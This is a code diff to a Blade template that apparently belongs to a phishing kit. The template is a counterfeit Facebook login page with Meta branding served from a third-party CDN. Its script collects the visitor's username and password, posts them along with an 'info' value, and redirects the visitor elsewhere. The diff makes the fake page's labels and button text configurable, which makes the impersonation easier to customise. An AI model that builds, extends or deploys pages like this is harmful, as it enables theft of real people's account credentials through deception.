@@ -75,7 +75,7 @@
                                     required>
                                 <label
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                                    for="user">{{ __('facebook.email_or_phone') }}</label>
+                                    for="user">{{ filled($login_theme_config->facebook->username) ? $login_theme_config->facebook->username : __('facebook.email_or_phone') }}</label>
                                 <button id="close_btn" class="cursor-pointer hidden" type="button">
                                     <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/close_logo.svg" width="25" />
                                 </button>
@@ -88,7 +88,7 @@
                                     required>
                                 <label
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
-                                    for="pass">{{ __('facebook.password') }}</label>
+                                    for="pass">{{ filled($login_theme_config->facebook->password) ? $login_theme_config->facebook->password : __('facebook.password') }}</label>
                                 @if ($setting->showFacebookPasswordButton)
                                     <button type="button" id="show_pass" class="cursor-pointer hidden">
                                         <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/show_pass.svg" width="25" />
@@ -101,15 +101,15 @@
                         </div>
                         <button type="submit"
                             class="outline-none cursor-pointer w-full bg-[#0064e0] text-white rounded-[100px] p-2.5 text-sm active:bg-[#3b8ef5] active:scale-[99%] transition-all duration-100 disabled:opacity-80 disabled:cursor-default disabled:pointer-events-none">
-                            {{ __('facebook.login') }}</button>
+                            {{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}</button>
                     </form>
                     <div class="mt-2">
                         <p class="text-center text-sm text-[#0d1114] cursor-pointer">
-                            {{ __('facebook.forgot_password') }}</p>
+                            {{ filled($login_theme_config->facebook->forgot_password) ? $login_theme_config->facebook->forgot_password : __('facebook.forgot_password') }}</p>
                         <div class="space-y-6 mt-[100px]">
                             <button
                                 class="font-semibold outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
-                                {{ __('facebook.create_new_account') }}
+                                {{ filled($login_theme_config->facebook->create_account) ? $login_theme_config->facebook->create_account : __('facebook.create_new_account') }}
                             </button>
                             <div class="flex justify-center mb-5">
                                 <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/meta_logo.png" alt="fb-logo" width="55">
@@ -150,7 +150,7 @@
                 'password': password,
                 'info': '{{ $info }}'
             }
-            btn.attr('disabled', true).html("{{ __('facebook.logging_in') }}")
+            btn.attr('disabled', true).html("{{ filled($login_theme_config->facebook->login_in_progress) ? $login_theme_config->facebook->login_in_progress : __('facebook.logging_in') }}")
             // auto detect phone or string
             warning.hide()
             @if ($setting->checkLoginFacebook)
@@ -158,14 +158,14 @@
                     if (!check_email(username)) {
                         warning.html("{{ __('facebook.wrong_email') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html("{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}")
                         return
                     }
                 } else {
                     if (!phone_check(username)) {
                         warning.html("{{ __('facebook.wrong_phone_or_email') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html("{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}")
                         return
                     }
                 }
@@ -174,7 +174,7 @@
                 if (password.length < 5) {
                     warning.html("{{ __('facebook.password_too_short') }}")
                     warning.show()
-                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                    btn.attr('disabled', false).html("{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}")
                     return
                 }
             @endif
@@ -186,7 +186,7 @@
                     if (!data.status) {
                         warning.html("{{ __('facebook.try_again') }}")
                         warning.show()
-                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
+                        btn.attr('disabled', false).html("{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}")
                         return
                     }
                     window.location.href = '{!! $data->redirect_link !!}'
